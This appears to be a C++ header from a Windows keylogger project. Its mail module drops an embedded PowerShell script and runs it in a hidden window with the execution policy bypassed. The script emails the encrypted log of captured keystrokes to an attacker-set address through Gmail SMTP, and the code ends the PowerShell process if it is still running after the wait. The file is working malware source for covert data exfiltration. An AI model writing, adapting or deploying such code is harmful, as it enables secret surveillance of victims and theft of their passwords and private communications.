#ifndef SENDMAIL_H_INCLUDED
#define SENDMAIL_H_INCLUDED

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME L"[powershell_name].ps1"

//sendmail.h uses powershell to send an email detailing the keystrokes recorded within the time frame
//by attaching the encrypted .log file to the email
namespace Mail
{
    #define X_EM_TO L"[recipient email address]"
    #define X_EM_FROM L"[sender email address]"
    #define X_EM_PASS L"[sender email password]"

const std::wstring &PowerShellScript =
L"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
L"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
L" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
L"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
L"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
L"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
L"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
L"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
L"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
L"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
L"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
L"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
L"  ForEach ($val in $Attachments)\r\n                    "
L"        {\r\n               "
L"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
L"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
L"}\r\n                catch\r\n                    {\r\n                        exit 2; "
L"\r\n                    }\r\n            }\r\n "
L"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
L"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
L"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
L"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
L"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
L"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
L"Send-EMail -attachment $Att "
L"-To \"" +
 std::wstring (X_EM_TO) +
 L"\""
L" -Body $Body -Subject $Subj "
L"-password \"" +
 std::wstring (X_EM_PASS) +
  L"\""
L" -From \"" +
 std::wstring (X_EM_FROM) +
L"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS

    //replaces the "what" in a wstring with the "with"
    std::wstring StringReplace(std::wstring s, const std::wstring &what, const std::wstring &with)
    {
        if(what.empty())
        {
            return s;
        }
        size_t sp=0;

        while( (sp=s.find(what,sp) ) != std::wstring::npos)
        {
            s.replace(sp, what.length(), with), sp +=with.length();
        }
        return s;
    }

    //checks if file was created ok
    bool CheckFileExists(const std::wstring &f)
    {
        std::wifstream file(f);
        return (bool)file;
    }

    //creates the powershell script using the variable above and checks if it was
    //created ok
    bool CreateScript()
    {
        std::wofstream script(IO::GetOurPath(true) + std::wstring(SCRIPT_NAME));

        if(!script)
        {
            return false;
        }
        script << PowerShellScript;

        if(!script)
        {
            return false;
        }
        script.close();
        return true;
    }

    Timer m_timer;

    int SendMail(const std::wstring &subject, const std::wstring &body, const std::wstring &attachments)
    {
        bool ok;

        //making sure the Directory exists
        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok)
        {
            return -1;
        }
        //getting the path and the script name and placing them in a super wstring
        std::wstring scr_path = IO::GetOurPath(true) + std::wstring(SCRIPT_NAME);
        //if file doesn't exist: create it
        if(!CheckFileExists(scr_path))
        {
            ok = CreateScript();
        }
        //if creation was unsuccessful return
        if(!ok)
        {
            return -2;
        }

        //powershell requires admin rights to work
        //however we can use this flag to bypasss that
        std::wstring param = L"-ExecutionPolicy ByPass -File \"" + scr_path + L"\" -Subj \""
                            + StringReplace(subject, L"\"", L"\\\"") +
                            L"\" -Body \""
                            + StringReplace(body, L"\"", L"\\\"") +
                            L"\" -Att \"" + attachments + L"\"";
        //this is windows api
        SHELLEXECUTEINFOW ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFOW);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = L"open";
        ShExecInfo.lpFile = L"powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = NULL;

        ok = (bool)ShellExecuteExW(&ShExecInfo);
        //if script wasn't executed return -3
        if(!ok)
        {
            return -3;
        }
        //wait for 7 seconds
        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        //this is an anon function, also known as the lambda function
        //new to c++11
        //we're using it here to access all the variables from the sendmail function
        m_timer.setFunction([&] ()
        {
            WaitForSingleObject(ShExecInfo.hProcess, 6000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            //now we got the exit code
            //if its 259, then it couldnt follow thru
            //but its still running so we gotta terminate that
            if( (int)exit_code == STILL_ACTIVE)
            {
                TerminateProcess(ShExecInfo.hProcess, 100);
            }
            Helper::WriteAppLog(L"<From SendMail> Return Code: " + Helper::toSTDString( (int)exit_code));
        });

        m_timer.repeatCount(1L);
        m_timer.setInterval(10L);
        m_timer.start();
        return (int)exit_code;
    }

    //allows us to send multiple attachments
    int SendMail(const std::wstring &subject, const std::wstring &body, const std::vector<std::wstring> &att)
    {
        std::wstring attachments = L"";
        if(att.size() == 1U) //1 unsigned integar
        {
            attachments = att.at(0);
        }
        else
        {
            for(const auto &v : att)
            {
                attachments += v + L"::";
            }
            attachments = attachments.substr(0, attachments.length() - 2);
        }

        return SendMail(subject, body, attachments);
    }

}


#endif // SENDMAIL_H_INCLUDED
